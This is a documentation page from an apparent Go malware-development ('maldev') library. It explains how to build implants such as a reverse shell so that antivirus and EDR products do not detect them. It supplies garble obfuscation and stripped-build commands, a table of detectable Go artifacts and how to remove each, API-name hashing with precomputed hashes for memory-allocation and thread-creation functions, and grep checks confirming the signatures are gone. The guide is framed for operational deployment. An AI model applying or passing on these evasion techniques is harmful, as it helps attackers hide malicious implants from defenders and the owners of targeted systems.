---
last_reviewed: 2026-04-27
reflects_commit: a705c32
---

# OPSEC Build Pipeline

[<- Back to README](../README.md)

Building maldev implants for operational use requires stripping Go-specific artifacts that EDR/AV products use for detection.

---

## Quick Start

```bash
# Install garble (one-time)
make install-garble

# OPSEC release build
make release BINARY=payload.exe CMD=./cmd/rshell

# Debug build (with logging)
make debug BINARY=debug.exe CMD=./cmd/rshell
```

---

## What Gets Stripped

| Artifact | Detection Risk | Mitigation |
|----------|---------------|------------|
| `.pclntab` (Go PC-line table) | **Critical** — single most reliable Go identifier | garble randomizes it |
| Package paths (`github.com/oioio-space/maldev/inject`) | **High** — static YARA rules | garble + `-trimpath` |
| String literals (`"NtAllocateVirtualMemory"`) | **High** — signature fodder | garble `-literals` + `CallByHash` |
| Symbol table | Medium — function names visible in debugger | `-ldflags="-s"` strips it |
| DWARF debug info | Medium — source file references | `-ldflags="-w"` strips it |
| Build ID | Low — links to build environment | `-buildid=` empties it |
| Console window | Low — visible to user | `-H windowsgui` hides it |
| Runtime panic strings | Low — "goroutine", "fatal error" | garble `-tiny` removes them |

---

## Build Modes

### Development (default)

```bash
go build -trimpath -ldflags="-s -w" -o dev.exe ./cmd/rshell
```

- Symbols stripped, debug info stripped, paths trimmed
- **Still identifiable as Go** (pclntab intact, strings visible)
- Use for: testing, development, non-operational builds

### Release (OPSEC)

```bash
CGO_ENABLED=0 garble -literals -tiny -seed=random \
    build -trimpath -ldflags="-s -w -H windowsgui -buildid=" \
    -o payload.exe ./cmd/rshell
```

- garble randomizes all symbols and type names
- `-literals` encrypts all string literals (decrypted at runtime)
- `-tiny` removes panic/print support strings
- `-seed=random` ensures each build is unique
- **Significantly harder to identify as Go or attribute to maldev**

### Debug (with logging)

```bash
go build -trimpath -tags=debug -ldflags="-s -w" -o debug.exe ./cmd/rshell
```

- Enables `internal/log` real output (slog to stderr)
- Use for: troubleshooting in controlled environments
- **Never deploy debug builds operationally** — log strings are in the binary

---

## CallByHash: Eliminating Function Name Strings

Even with garble, `Caller.Call("NtAllocateVirtualMemory", ...)` leaves function name strings in the binary because garble doesn't encrypt function arguments that are computed at runtime.

**Solution**: Use `CallByHash` with pre-computed constants:

```go
// BAD — "NtAllocateVirtualMemory" appears in binary
caller.Call("NtAllocateVirtualMemory", ...)

// GOOD — only 0xD33BCABD (uint32) in binary
caller.CallByHash(api.HashNtAllocateVirtualMemory, ...)
```

Pre-computed hashes are in `win/api/resolve_windows.go`:

| Function | Hash |
|----------|------|
| `NtAllocateVirtualMemory` | `0xD33BCABD` |
| `NtProtectVirtualMemory` | `0x8C394D89` |
| `NtCreateThreadEx` | `0x4D1DEB74` |
| `NtWriteVirtualMemory` | `0xC5108CC2` |
| `LoadLibraryA` | `0xEC0E4E8E` |
| `GetProcAddress` | `0x7C0DFCAA` |

For functions not in the pre-computed list, use `hash.ROR13(name)` at development time and hardcode the result.

---

## garble Reference

[garble](https://github.com/burrowers/garble) is the only maintained Go obfuscator compatible with recent Go versions.

```bash
# Install
go install mvdan.cc/garble@latest

# Flags
garble [flags] build [go build flags]

# Key flags:
#   -literals     Encrypt string literals
#   -tiny         Remove extra runtime info
#   -seed=random  Random obfuscation seed per build
#   -debugdir=dir Dump obfuscated source for inspection
```

**Limitations**:
- Increases binary size ~10-20% (encrypted strings + decryption stubs)
- Slightly slower startup (string decryption)
- `-tiny` removes `fmt.Print`/`panic` support — ensure your code handles errors via `error` returns, not panics
- Cannot obfuscate the Go runtime itself (goroutine scheduler, GC)

---

## Post-Build Verification

After building, verify OPSEC quality:

```bash
# Check for Go runtime strings
strings payload.exe | grep -iE "goroutine|runtime\.|GOROOT|go1\." | wc -l
# Target: 0 with garble -tiny

# Check for maldev package paths
strings payload.exe | grep -i "maldev\|oioio" | wc -l
# Target: 0 with garble

# Check for NT function names
strings payload.exe | grep -iE "NtAllocate|NtProtect|NtCreate|NtWrite" | wc -l
# Target: 0 with CallByHash

# Check for RWX memory (should not exist in stubs)
# Run under a debugger and check VirtualAlloc calls for PAGE_EXECUTE_READWRITE
```
